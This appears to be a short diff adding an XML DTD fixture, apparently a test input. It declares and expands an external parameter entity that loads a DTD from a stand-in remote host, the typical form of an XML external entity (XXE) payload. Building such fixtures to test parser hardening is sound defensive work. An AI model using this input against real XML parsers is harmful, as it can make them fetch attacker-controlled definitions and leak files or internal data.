@@ -1,0 +1,3 @@
+<!ENTITY % remote SYSTEM "https://example.invalid/remote.ent">
+%remote;
+<!ELEMENT root EMPTY>
